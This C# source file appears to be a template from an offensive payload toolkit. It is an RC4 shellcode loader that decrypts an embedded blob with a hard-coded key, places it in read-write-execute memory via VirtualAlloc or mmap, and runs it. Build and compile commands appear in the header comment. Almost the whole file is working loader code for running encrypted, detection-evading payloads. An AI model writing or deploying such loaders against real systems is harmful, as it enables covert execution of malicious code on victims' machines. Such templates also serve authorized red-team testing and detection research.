/*
 * rc4_loader.cs - RC4 stream-cipher shellcode loader template (C#)
 * ================================================================
 * Decrypts an embedded RC4 blob (KSA + PRGA, length-preserving) and
 * executes it as a function. RC4 encryption == decryption.
 *
 * Build-time parameters (see payloads/rc4_300b.meta.json):
 *   key : deadbeefcafebabefeedfacec0ffee00 (16 B)
 *
 * Regenerate the payload include with the builder:
 *   python3 tools/gen_inc.py rc4 300 --lang cs --out loaders/csharp/rc4/payload_inc.cs
 *
 * Compile (mono):
 *   mcs -out:rc4_loader.exe rc4_loader.cs payload_inc.cs
 *   mono rc4_loader.exe
 */
using System;
using System.Runtime.InteropServices;

static class Rc4Loader
{
    static readonly byte[] Key = {
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE,
        0xFE, 0xED, 0xFA, 0xCE, 0xC0, 0xFF, 0xEE, 0x00
    };

    /* KSA + PRGA. RC4 is symmetric: decrypt == encrypt. */
    static byte[] Decrypt(byte[] ct)
    {
        byte[] s = new byte[256];
        for (int i = 0; i < 256; i++) s[i] = (byte)i;
        int j = 0;
        for (int i = 0; i < 256; i++)            /* KSA */
        {
            j = (j + s[i] + Key[i % Key.Length]) & 0xff;
            byte t = s[i]; s[i] = s[j]; s[j] = t;
        }
        byte[] pt = new byte[ct.Length];
        int a = 0;
        j = 0;
        for (int k = 0; k < ct.Length; k++)      /* PRGA */
        {
            a = (a + 1) & 0xff;
            j = (j + s[a]) & 0xff;
            byte t = s[a]; s[a] = s[j]; s[j] = t;
            pt[k] = (byte)(ct[k] ^ s[(s[a] + s[j]) & 0xff]);
        }
        return pt;
    }

    /* ---------------- execution method (shared by all templates) ------- */

    delegate int PayloadFn();

    static bool IsWindows
    {
        get
        {
            PlatformID p = Environment.OSVersion.Platform;
            return p == PlatformID.Win32NT || p == PlatformID.Win32Windows || p == PlatformID.WinCE;
        }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint type, uint protect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr addr, UIntPtr size, uint freeType);

    [DllImport("libc", SetLastError = true)]
    static extern IntPtr mmap(IntPtr addr, UIntPtr length, int prot, int flags, int fd, IntPtr offset);

    [DllImport("libc", SetLastError = true)]
    static extern int munmap(IntPtr addr, UIntPtr length);

    static int Run(byte[] shellcode)
    {
        IntPtr mem;
        if (IsWindows)
        {
            mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000 /*MEM_COMMIT|MEM_RESERVE*/,
                               0x40 /*PAGE_EXECUTE_READWRITE*/);
            if (mem == IntPtr.Zero) { Console.WriteLine("[-] VirtualAlloc failed"); return -1; }
        }
        else
        {
            mem = mmap(IntPtr.Zero, (UIntPtr)shellcode.Length,
                       0x7 /*PROT_READ|PROT_WRITE|PROT_EXEC*/,
                       0x22 /*MAP_PRIVATE|MAP_ANONYMOUS*/, -1, IntPtr.Zero);
            if (mem == new IntPtr(-1)) { Console.WriteLine("[-] mmap failed"); return -1; }
        }
        Marshal.Copy(shellcode, 0, mem, shellcode.Length);
        int r = ((PayloadFn)Marshal.GetDelegateForFunctionPointer(mem, typeof(PayloadFn)))();
        if (IsWindows)
            VirtualFree(mem, UIntPtr.Zero, 0x8000 /*MEM_RELEASE*/);
        else
            munmap(mem, (UIntPtr)shellcode.Length);
        return r;
    }

    public static void Main()
    {
        byte[] plain = Decrypt(Payload.Data);
        Console.WriteLine("[+] RC4 decrypted " + plain.Length + " bytes");
        int r = Run(plain);
        Console.WriteLine("[+] payload returned " + r);
    }
}
